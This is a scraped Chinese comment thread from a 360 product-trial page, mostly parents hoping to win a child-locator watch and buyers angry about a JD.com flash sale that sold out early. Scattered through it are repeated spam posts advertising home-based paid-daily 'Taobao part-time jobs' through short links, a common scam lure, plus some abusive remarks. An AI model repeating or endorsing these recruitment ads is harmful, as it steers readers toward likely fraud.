有预约码了，可以买2个吗？ 
孩子迫切的需要这个呀，希望能申请到。
孩子们迫切的需要这个呀，希望能申请到。
评选规则是什么，随机抽吗，还是有条件抽
为毛tm都是会员？是不是欺负那些不是会员的？
恭喜幸运儿们哦，这个概率是否可以去买彩票了，呵呵！
非常时尚，孩子一定会喜欢，希望申请上。
能申请都是有账号的，都叫会员，你要是中了还是一样显示“奇酷会员”
送宝贝的，最好的礼物！
一切为了孩子哦，很贴心的创意，期待定位的准确性！
关注好久了
真的真的好期待。
认真的查看了360的所有产品，太有创意了，超爱。。。。，在我发现的那一刻起，我就爱上了这些产品，非常期待创意中的那些产品可以尽快和大家见面。现在我已成为了360产品的忠实客户，每天开机的第一件事情就是进入本站，查看最新产品。本期我申请了参加了：“360儿童卫士 2”儿童定位手表，真心的希望自己能够成为本期幸运儿中的一名。这也算是奖励我儿子近期学习成绩表现优秀的最好最棒的礼物了。
并且这个礼物绝对能够满足，我儿子现年龄段那些超级天马行空、超级幻想、超级神秘、超级爱探索、超级科幻的好奇心······，若是他能得到这个礼物，相信他又会给我们家长还有他的语文老师带来一个非常棒的好作文······，最后十二的期待。
不错 官方视频太猥琐了 哈哈
关注很久了
好像很高端  大气
期待能顺利入选。
很强大，真的很希望能赶快买一个用，或者做个小代理。
11万申请人？堪比买彩票的获奖概率了，期待退出产品.
感觉还不错
顶顶顶顶顶顶顶顶顶顶
依旧没有。。。有点伤心
你把线切开看，是玻璃纤维的就是光纤，最多叫网络供应商再给接一次！
一直在盼望。
一千一比一的中签数。厉害啊
用的不错亲   
太有才了，不错
看看试用的人数就知道是这么受欢迎的产品，中签率太太太。。。不报希望了。
希望像介绍中说的一样好用，实用，还有希望价格不要太高，亲民点
望像介绍中说的一样好用，实用，还有希望价格不要太高，亲民点 
抢不到呀，才8个G
希望能选进，希望啊！天啊，让我入选吧！！！！！
送给我的女儿最好的礼物···
想要试用的人太多了，就像中彩票一样，110554分之100的几率。
真的真的好期待
并且这个礼物绝对能够满足，我儿子现年龄段那些超级天马行空、超级幻想、超级神秘、超级爱探索、超级科幻的好奇心······，若是他能得到这个礼物，相信他又会给我们家长还有他的语文老师带来一个非常棒的好作文······，最后十二的期待
想象力真丰富，希望早日问世，功能实用，材料环保，价格亲民，期盼中
要是移动联通4G3G2G通吃一定买一台
希望孩子安全平安的长大是每一个父母的心愿，想要一个送给儿子，如果好用的话会买个给我外甥，主要是他太淘气啦。当然价格亲民点更好。希望我能中 
哇哇。。。这么多的人啊。。老板给我打瓶酱油吧！！！
这个可以有，不知要几钱？
充平板电脑应该快点
压力大？大尼玛B，20个有15个是内部人员吧？再说了，你能肯定这20个人都写评测？占着茅坑不拉屎。
恭喜恭喜，不过再有几期你就不爱奇酷了，听哥们的，别期望太高，会很失望的，毕竟我也是过来人，我也是曾经的几万中那几个幸运儿。
写的不错！！
支持什么系统的客户端？
大哥，我写这篇测评的时候，米键还没出来呢！麻烦您看一下时间节点。
感觉好棒，直接可以加入nfc就棒极了
是智键可以加入nfc就棒极了 
希望能中，即使中不了也希望能早点开卖
期待，明天时间就快截止了，希望这次能够通过筛选，孩子正处在危险的边缘啊
这次比上次参与的人多多了
中一个送给小孩过六一。。。。。。
重在参与，希望能给孩子六一一个惊喜  不过希望尽快开售
希望孩子安全平安的长大是每一个父母的心愿，想要一个送给儿子，如果好用的话会买个给我外甥，主要是他太淘气啦。当然价格亲民点更好。希望我能中   
京东上架了我收到了
很想为宝宝买一个,什么时候创造完啊!
嗯, 感谢 360 , 实在太幸运了. 
原来如此！！！
这个创意好，强烈支持
很想试用一下，可就是筛选太慢
居然又中签了？看来之前写的评测没有白费！不过好像还没收到短信通知
真的很希望有个，让做父母的稍点担心
人类真的可以进入超能力世界？！期盼中！
期待中，加快脚步吧，快到碗里来
给孩子送个六一儿童节礼物！赞一个！
一口气买了30个，全送人了，效果一点都不好，买错了，还不给退
时间啊。。。。。。。。。。。。。。。。。。。。。。。。。
很强大，真的很希望能上市
等待ing…希望好运看看来哦
好东西，怎么购买
什么时候上市
申请了一个，不知能不能通过审核，好想在6.1前能送一个给宝宝
期待  希望能赶在儿童节之前给儿子给儿子个惊喜   祝我好运吧
希望造型能多样化，360的logo不要太明显，如果拐骗儿童的发现有定位表，那肯定会先扔掉的。
感觉和智键一样
希望造型能多样化，360的logo不要太明显，如果拐骗儿童的发现有定位表，那肯定会先扔掉的。
好，我想买个！
希望下次可以中！我一定会赢得！！！！！！！！
女儿总是喜欢和朋友去远处玩儿，管也管不住，唉..............小孩啊。希望6.1给她一个惊喜！~~~
真的不敢相信,自己居然中了,感谢360对我人品的认可!回复酷友的疑问,我不是内部人员,我只是一个热爱360的普通人!
水水更健康 
6.1 快到了，给孩子的礼物，不错。。。还有产品标识内敛点才好，360标识太明显了
认真的查看了360的所有产品，太有创意了，超爱。。。。，在我发现的那一刻起，我就爱上了这些产品，非常期待创意中的那些产品可以尽快和大家见面。现在我已成为了360产品的忠实客户，每天开机的第一件事情就是进入本站，查看最新产品。本期我申请了参加了：“360儿童卫士 2”儿童定位手表，真心的希望自己能够成为本期幸运儿中的一名。这也算是奖励我儿子近期学习成绩表现优秀的最好最棒的礼物了。 
希望能申请到
那按照你的说法给我解释一下1:55那个图片呗？
看样子无论如何赶不上六一了!
这几率没希望了吧，希望价格不要太贵。
这3000:1的比例也叫高，笑死我了。。。。。
赞一个，希望也能试用。
人类真的可以进入超能力世界？！期盼中！
天天看，天天盼，希望能通过，现在已经有11万多人申请了1/1000的机会啊！我几十年没中过奖了，就让我中一次吧！
其实360知不知道一件事呢，现在儿童很少戴手表了，戴手表可能对于专业拐人的来说，有点太显眼了，建议换成项链或者一些其它的，小小的，像小饰品之类的，不容易察觉的东东
就150个啊.太少点了
支持360.。。。。。。。。。。。。。。。。。
希望越大，失望也就越大~~
强烈支持，希望360越来越好
几率也许很低，我也要试一下，如果申请不到就喜欢价格不要太高。
哇啊啊啊啊啊啊、、居然我没中- -，唉。多申请。就不信一直不中
认真负责，从不丢孩子，用不着
室内丢失 就找不到了吧
我就是你们说的那种连仙人掌都能种费掉的人，但又特别的喜欢花，真心的期待！
科技的进步带给我们有很多的帮助
我觉得这是最好推荐试用创意品的网站，莫大的支持持续发展下去。
11万分之一。。。好可怜的感觉 
特别想有一个，上班方便多了 
非常好的商品
 因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
360儿童卫士的广告铺天盖地，人贩子也会知道滴。要低调些才能安全。
说的很详细，赞一个~
希望好运气，谢谢360！
能通话么？还是只是单方面取音？
何时才能买到啊啊    啊啊   啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊 啊啊啊啊啊
好东西    就是价格………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
很用心的报告！
要是有无线电通话就好了
尼玛什么玩意啊，预约成功了说是5月20号上午10点京东抢购，8点多就兑换了预约码，9点上来说还不能抢购，9点半还是不能抢购，结果9点50上来就显示无货，到现在10点10分钟了，一直刷新一直说无货，你麻痹不是说10点开抢吗？为什么9点50就显示无货了？是你们京东内部人提前抢光了还是故意留给黄牛了？对360和京东 第一次 失望！！
现在预约要明年一月才能收到、价格三档8G16G32G。370元、430元。490元左右。好好象包邮。
尼玛刚才加入购物车是灰色的，现在加入购物车的字样没有了，变成立即抢购了，也还是灰色的！你们要是直接内部人抢完了就别弄出大家预约的噱头来，要是直接供货给黄牛来故意提高价格也不要来这里忽悠大家！什么玩意啊
同样的情况，坑人的京东，坑人的360！！！
被京东坑了一次，10点显示压根没货，压根是被忽悠了.....
不小心购买了两次，没想到变成了两个还能购买，不是一个码只能买一个的吗？已付款，预计21号到。
还有同样情况的人都来说说，给京东和360敲敲警钟，以后忽悠人带点智商！
某宝上立刻出现了360安全路由器的链接，这尼玛是什么情况？真的是360和京东故意给黄牛的吗
京东坑人，360更坑人，10点完全是忽悠人，直接无货显示
你怎么抢到了？你是黄牛吗？
360忽悠人啊 我码也兑了 根本没给机会抢购啊 什么意思 给个说法 晕 晕
我也好希望能够有啊！孩子现在还小 对新奇的事物比较的好奇，看到大人们带手表他也想要 可是我们又怕辐射大，所以想要360儿童卫士 2既能够随时定位又可以让孩子得到满足。
坑蒙拐骗忽悠人  
我怎么可能是黄牛，是第一个点了没反应，然后开了第二个网页，结果就买了两个，没想到订单都生成了
新创意，不知道是否耐用！
一直刷新，到十点直接已抢完。不会搞错吧，比小米手机抢的还快，最起码小米会显示在排队中，京东直接无货，强烈怀疑有1万台吗？*宝网上道有卖的，这是什么情况，请解释！！！！
能否给我一个？链接 怎么联系你？
360给个解释，预约的时候不是说一个码只能购买一个吗？为什么别人一个码却能买2个？
 因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】   
哎 真的给忽悠了 一看10点了马上去京东看 无货了 码也兑了  失望啊
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客即可报名 http://t.cn/8spTPuL【复制到地址栏打开】  
是的，要双方通话才好呢。
说10点抢购的，为什么9点50上去 就已经没货了！！还有，一个码说直能买一个的，结果人家能买2个，按照这个情况，一个码可以买N个，都抢给黄牛了。。。这360和京东就要给解释下了。。。
不做广告，360怎么提高知名度，怎么赚钱呢。所以啊，这个东西最后就是鸡肋了。没什么真正安全的。
太厉害了，看来小编的眼光还是很不错的啊。很会挑人选。
因业务发展招淘宝傔职人员，有意者请博客联系我 http://t.cn/8spTPuL【复制到地址栏打开】 要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
 因业务发展招淘宝傔职人员，有意者请博客联系我【 http://t.cn/8spTPuL】复制到地址栏打开。要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。
痛恨玩弄消费者，同意的举手
外形要做的像儿童手表，时尚，实用，但同时不能被人贩子看出来是定位手表。还有就是待机时间要长！
这完全跟幸运无关，跟几率无关！是看小编的爱好，是看个人的编写水平，唉！其实我们只是个分母，希望小编真的是要随机抽 
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
这个是专为女性设计的智能产品啊。
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～
很喜欢，就是贵了些，期待降价中~~
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
京东个垃圾，既然加入购物车了，就要保证有货，没货算什么？ 你既然抢完了，不是就不能加入购物车了，垃圾京东，垃圾360
延期啦，说5月22号的，又增加了50部，有信心得到试用，谢谢360
之前购买过类似可充电的手机套，大概价格在一百多元左右。需要先给手机壳充电，然后待手机没电的时候就可以开启为手机充电了。当时产品的缺点是：设计笨重，又大又厚，外壳电池续航时间也不是很久。充电麻烦，还不如直接给手机直充，所以就丢弃不用了。所以感觉这款产品设计点还真不是很新颖。就像其他评论说的，什么时候能实现太阳能充电，那就真正绿色环保油节能省时了。
昨天看是到22号的，怎么又改期了？
我也是受害者，京东居然学小米的营销手法，加入购物车居然没货，太心寒了
本来还想在京东买其它东西的，现在经过这次抢购就不会再买了！
给自己 找份宅家的网络 差事吧～ ～不限制工作时间，做的越多挣的越多～～（宝妈、学生、上班族都可以）【http://t.cn/8spTPuL】复制到 浏览器打开 ～即可报名咨询 ～每夭5o~15o，我详细作讲解～ 
强烈要求360、京东给说法，问360说找京东，问京东又说看下回好久抢。。。。。。奸商啊
抢到了，要下完订单才算真正抢到，所有网站都是这样的
完全是耍我们消费者
我都怀疑有没有1万台，有可能就是吸引眼球
你抢到了？ 
我早上9点45就起来一直刷新呢，10点的时候还没出现抢购，刷了三次才出现
我一直刷新，一直都是无库存，再最后居然抢购结束…NM等了10天就这结果，还不如直接买其他产品呢！坑货！
已经买到了，很好很开心
要两台苹果手机，确实不是很现实哦，如果能不限制手机，不限制系统那就还算完美了
经过傲世堂对三国类游戏的理解与深度打磨《征战四方2》  特色一、傲世堂第六将登场　特色二、及时布阵九宫格　特色三、十三州牧争天下　特色四、全景天时系统　特色五、绘卷式副本推图 唯一在线客服QQ：1401219639　　爆火征战四方2QQ群：332960851 20号下午2点开启网站http://zzsf.gcldcc.com/
希望这次能中
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
脑子里第一个念头就是在想，当我站在上面会不会倒的问题，哈哈
一直拿我们这些消费者来耍，怀疑有没的一万台，从10点开始刷新，一直无库存。他这还没提升购买的人，几点购买的数据，纯粹坑人。看样子还真的不敢在京东买东西了，太让人伤心了。
既然没这么多活，就别来忽悠我们
试问现在有几个人捡到手机后还会将你的手机返还？
完全是骗人的，忽悠消费者！以后全民***360产品，果断把360产品全部卸载！草！垃圾！都不买看他还忽悠谁！垃圾360!全他妈骗子！周鸿祎SB！
抢购需要技术，因为黄牛多
抢到了，抢购全程用了不到3秒钟.
表示怀疑 坑爹吗 
已经准备去结算了，结果出现没货了 南通地区的朋友有抢到的吗  
一直关注360儿童卫士，计划360儿童卫士一代发售就买一个，不知道为什么360儿童卫士一代一直没有发行
很期待能申请到
这个产品真的非常好，目前没有拿到，所以只能说是创意好。 现在社会上孩子受到的诱惑太多，危险也直线上升，所以如果有一个这样的产品，非常有助于家长去更多的了解孩子的动向以便及时作出调整。 希望尽快上市。用户多了，用户体验会更多，这样后面出来的产品会更加完善更加安全。
节能环保的洗衣球~~ 酷  就是不知道洗得干净不？
哎 要是能直接去你们总部提货就可以了... 我坐公交车半小时就能到总部，京东还得等一天  郁闷
没有效果，没有拆机图，感觉对我们没有任何帮助啊。 只看到对你的好处，而不知道你用的怎么样。
天灵灵,地灵灵。老天爷爷快显灵！【一定要抢到！】
你就是白痴你一个..就你那网速跟乌龟移动一样还想抢购~！
今天已经十一万了，看来大家都对这款产品期待呀。希望360的研发能开发出更新更好的产品。无限支持！
你基本可以撞墙了..就你乌龟的网速还抢购
就你那网速回炉吧...抢购不到攻击360..最好你别用360的任何产品
1W台哪经得起150W人预约抢购...网速跟进吧
天灵灵,地灵灵。老天爷爷快显灵！【一定要抢到！】
产品很好，就是价格太贵了
我也需要一款这样的手表，只要不贵就行了，呵呵，100元左右价格最好！！http://www.yichangdaikuan.com
我觉得有一款像这样的一种专门为儿童制作的东西是很难得的，更何况是一种这么好的手表。为了儿童的安全，需要时时关注自己的孩子在哪儿，以防被坏人拐走遭撕票。但是，我想给你们提一个小小的建议，让手表的外观可爱新颖一点，比如：加一个米老鼠啊，唐老鸭啊，喜羊羊之类的，我想，孩子一定会更喜欢的。我很期待这次能被抽中。 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
好东西啊，不错啊
申请的人还真不少的哟！  360的产品做的还是不错哟！！
太好了,有加了50个.
太好了,有加了50个.
需要这款手表，不知道能不能抽中
希望抽到我.
前辈莫急，等东西到了。我再详细汇报
希望抽到我.
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
东西不错，价格太贵了
不错，不错赞一个
需要这款手表，不知道能不能抽中
希望抽到我.
如果带有通话功能就更强了啊
养在玻璃钢柜中的花花草草和养在笼子里的猫狗没啥区别。
单买这个还不如买带检测功能空气净化器，专业空气质量检测人员除外
多大的球啊！做成悬浮式的该多好啊！还需要有超高的智能系统
希望可以抽到我噢
每个人都期待那份幸运，但是不知道幸运之360会钟情与谁。期待中----
此物上市必火，市场太大了，就看应用的操控和稳定性如何
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
这个手表对有孩子的家庭来说，太有用了，急切希望能抽到！！
要是做成徽章或纽扣状，扣在衣服上就更好了，否则小孩子解开容易弄丢。
~这和以前手机没有触摸屏前全是按键有区别吗？设计要超前美观才行！ ~比如现在的声控，如果精确一点肯定比这好使吧！ ~比如可以将手机背面或者手机壳手势控制，比这贴个创可贴好看多了吧！
总有那么点辐射
功能和智键相近，但实用性应该比较好
对有孩子的人来说,这款手表太实用了,它就像给了家长一安心丸,真希望能抽到,即使抽不到,也一定会购买一块的
我家小孩上个星期五晚上找不见了。找到11点多。查小区监控，最后报警。还好找到了。所以我这几天一直再找这样的产品。太需要了
有用的产品！太棒了
同意TLmajin的,带手腕上小孩容易去玩儿,扣在衣服上的功能不错,又小,也不容易被发现
东西好,会不会价格太高了啊 
哪来的sb啊
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
会不会有人注册好多号来申请？
这款手表真是太切合我的需要了。。希望可以抽到。。也希望早日可以买到。。给姐姐的孩子也买一个。。
加油，不奢望必中，但希望能中
现在的徽章扣，反而更容易丢和坏，手表的反而更安全些，不容易丢失。就是不知道录音效果如何，如果音效和定位都好的话，就真的是一款不错的产品了！
179美元哦。有些贵啊。
好想为宝宝弄到一个，好需要啊，希望抽到~~~~~~~~~~~
价格500内比较好吧。老烟枪想买个。
中国有幼儿、老人的家庭必备，期待开发更多更好玩更有用途的新产品
这么萌，你家人知道么。。。
戳zhong我！戳zhong我！戳zhong我！戳zhong我！戳zhong我！戳zhong我！戳zhong我！戳zhong我！
这个比墨迹的空气果靠谱多了
确实关注很久了，一直准备买的，可是老是没有现货，希望2出来后卖的比1更火i，嘿嘿
希望我的宝宝能有一个
不错哦，期待能试用
这样一款产品的出现真的很好,要知道孩子是两个家庭的希望,特别是老人看管的孩子特别 需要这样一款产品,期待中!
我们夫妻都在外地工作，老人看护孩子特别需要这样的一款产品，真心希望我的宝宝能得到这样一个试用机会，让我们都能安心工作，后顾无忧，再也不会因为找一到孩子在哪而着急了，谢谢！
这是一款很有创意的手表，值得赞！如果我小孩能用，一定酷！这又是一款为天下父母放心让孩子出门的电子眼，是一位安全卫士，更值行赞！如果选中我小孩用，一定行！
我关心的是，在哪里可以买到？
预约了两个多星期了，怎么还不可以买？那是乍地？
很相要，期待我能中试用 。
我也赞一赞，粘粘好运气
希望申请能得到试用，等待中……
加油~~一定能中~天主爱小石头~
认真的填写了试用报告，希望有好运
谢谢 祝心想事成
没通过的原因总得说一下，不明不白的！被你选中的，又不讲话！
若得到试用一定会积极评测。期待中~
认真的填写了试用报告，希望有好运。
这个产品真的很好。360每一个产品都是那么给力，简单、方便、实用。
太贵了有点啊……
希望能被抽到，万分期待啊！！
这个手表用装SIM卡吗？
认真填写，希望能通过
萌物啊，才220mm高，价格咋样
支持一下国产货，看上去不错的东西啊
是不是会经常误按
作用其实和汽车GPS理论一样！建议产品扩大内存，地图更新最新版，GPS芯片提高到汽车GPS导航级！误差在10米内才有用，500米太大了，即使出现事情，查找起来也费时费力，而且误差的时间也不一定找的到
作用其实和汽车GPS理论一样！建议产品扩大内存，地图更新最新版，GPS芯片提高到汽车GPS导航级！误差在10米内才有用，500米太大了，即使出现事情，查找起来也费时费力，而且误差的时间也不一定找的到 
已经提交了申请，希望能够通过，希望我的孩子有一个快乐安全的童年！谢谢厂家做这样一个活动！
很安全的。
现在弄吧，直接进淘宝链接。
谁会逮你呢？
还有6份报告就全了。
真心觉得不错，出错率不知道会不会很高。期待 祝福
不错很详细，很用心啊
我有预约码也上京东换抢购资格，可是到点加入购车一只是白色 。上次在天猫抢智键时，有计时到开抢。这次京东骗了消费者。
谢谢观赏。我是coen。
突然想到以前看到一个画面，未来的人类手脚会退化，大脑越来越大
谢谢观赏。我是coen。
希望能给孩子一个安全的童年，让家长随时随地能够知道孩子的去向和动作
谢谢观赏。我是coen。 
希望能让家长随时随地知道孩子在哪
谢谢观赏。我是coen。  
报告到这里结束了
我叫刘明爽~~~
5月5号凌晨02:12
谢谢观赏。我是coen。  
谢谢观赏。我是coen。  
关注好久了，我的宝宝3岁，正好需要这样的安全设备。希望尽快上市。
认真按要求填写。期待能试用。
谢谢观赏。我是coen。  
感谢厂家对儿童安全问题的关注,向开发团队致敬！
还没有抽到我，我很期待！
很给力的评测文章~
很给力的评测~
谢谢观赏。我是coen。  
谢谢观赏。我是coen。  
习惯开头的第一行空着 
点击“立即购买”后，怎么还是要去预约啊？？？？？？？？？？
谢谢观赏。我是coen。  
谢谢观赏。我是coen。  
感觉很用心的报告！
有备无患的装备呀！支持360！
这个定位手表功能真的很强大，真的很想试用。
好想能申请成功 
真的很想试用，不知道能否会通过蓝牙或是网络感知孩子的方位和距离，如果有此功能将会大受欢迎。
希望能申请成功。amen
如果能带那种时间投影就好了，这样我躺在床上，放好闹钟的位置，不用起身就能看到时间。呵呵，懒人一个。
若能成功，批量买
淘宝儿童玩具200大洋你卖2000真当我们屌丝傻逼吗
很给力的评测~ 
谢谢观赏。我是coen。  
谢谢观赏。我是coen。  
希望可以拥有一次机会，感谢。
ini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL);
ini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL);
ini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL); 
ini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL); 
态度很积极啊！
垃圾，还不如中国的山寨手机强大，几百块钱一样有这投影功能！超清晰
希望可以开发一款给小宝宝的定位工具，防止小宝宝人贩子偷走。
设计挺不错的，既节水又不用看着洗衣机费精力。 但我想默默地问一句，这能洗干净么？
期待赶紧出货
me  too 同感
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
期待这个价格能比上一代优惠
看上去挺不错的，如果颜色再多点，那就更完美了！   我还有一个问题，这小小的东西，真有那么多的功能么？
这东西挺不错的，再多一点颜色，就更好了！
刚开始挺想买的，但看到了一次性，又觉得又不想买了，然后又看到了价格，一下子就绝对不买了，这东西......
很适合孩子的产品,期待中
也希望啊，但外国的东西，你想有那么便宜么？
创意挺不错的，正是我需要的！
还不如Q影呢，一样的效果
图蛮多~不错~
你知道我在等你吗。
除了Mac  mini，其他的都疯了吧
祝愿所有的小朋友都健康，快乐，茁壮成长
真希望早点试用到
亲爱的小伙伴们，在这个物价与月球接轨，工资与非洲接轨的时代，我们要拒绝月光，省钱有方。通过趣购58网购物，可享受更多的特价商品哦，赶紧来体验吧！ http://qugou58.com 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者 博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html 
感谢630
希望快点研究出来 
好想拥有它呀，我好害怕，在我们临沂这边刚刚又被人贩子把小孩给弄走了，现在是什么社会呀，感谢360
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html  
good 家里正为电池不够烦恼
大家都关注的是定价。除了顶级爱，质量以及实用性如何？ 
现在人贩子太多了，我们做妈妈的更加的不安心让宝宝一个人出门了，太可怕了。
祝愿所有的小朋友都健康，快乐，茁壮成长 
52   52   52
very good 
奇酷太有爱了，无奇不有，好强大，酷酷酷，强烈支持！！！
希望能让家长随时随地知道孩子在哪 
very 期待 
利用闲余时间，给自己找份宅家的网络差事吧～ ～不限制工作时间，做的越多挣的越多～～每天4 O～1 O O左右。（宝妈、学生、上班族都可以）有意者博客联系我 http://blog.sina.com.cn/s/blog_dd25d76b0101epe7.html
太贵了。价格大众化能接受的价格才好！作为电子产品大众化的价格才能有更多的人购买
价钱有点高，不符合我这个小平民，所以小平民我就继续踩着我的单车好了。
如果真这么牛逼，希望研究出来，价钱合理一点，不要太高
感谢开发此产品和宣传此产品的人，对家长们很有帮助。
能控制什么东西？我很好奇，ATM ？ 
贵死了，耳机而已，不需要这么贵的
很方便，用了一段时间很棒，拍照直接按一下，自动保存，精彩时刻随时抓拍，还有很多功能，很漂亮，都建议好几个伙伴购买了，嘿嘿  我是免费送给我的，感谢！
已加QQ群 希望获得更多机会，支持奇酷360
不错的净化器。
坏了以后维修费用是不是不便宜呀！坏了到哪去修？普通的电动车坏了就能找到维修的地方，而且也好在，这东西坏了到哪里去修呀！让普通的电动车人员维修，要是弄不好坏了对方恐怕一赔不起呀！返厂修不现实。价位太高，普通老百姓不会购买的。正真有钱的富人有几个！我是觉得这个是有钱人才会买的。纯粹是有钱骑得显摆的，要不就是有钱骑着溜达的
70美元=436.6880人民币
 这个我喜欢 实用
放厨房方便吗？
ini_set(&quot;display_errors&quot;, &quot;On&quot;); error_reporting(E_ALL);  
支持奇酷360 
保护上网保护上网
奇酷太有爱了，无奇不有，好强大，酷酷酷，强烈支持！！！
就知道选不上~
不知道实际定位效果如何？是否所有的地区定位都好？都稳定不会出错？电力持久环保，没电了又如何充电，要是能用光来充电也不错，只要是光就可以充电，带报警系统？
保护上网保护上网 
看看怎么样？
要是锁肯定比我的车贵.....
关键是衣服会怎样
这个符合广大人民群众。赞
顶了，奇酷 
这年头连个牙刷都是卖肾的节奏，让我以后这么活啊 
奇酷传递正能量！
29美元=180.9136人民币 唉
东西不错，可一次性的那就。。。。。。
很喜欢，可是我买不起哦
我like
什么时候有卖 
不错，可以代步
支持本产品，传递正能量。
太厉害了，强烈支持
奇酷好，奇酷的手表更好顶了奇酷
有了它，我的花花草草可以长得更好了，不过价格好像太高了，不适合大众消费
孩纸，是360
这个要是价格合理 就太有价值了
